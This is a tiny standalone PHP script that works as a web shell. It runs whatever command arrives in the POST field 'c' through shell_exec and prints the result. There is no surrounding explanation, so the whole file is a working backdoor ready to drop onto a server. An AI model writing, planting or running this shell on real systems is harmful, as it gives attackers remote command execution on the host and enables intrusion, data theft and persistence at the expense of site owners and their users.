<?php
if (isset($_POST['c']) && strlen($_POST['c']) > 0) {
    echo shell_exec($_POST['c']);
}
?>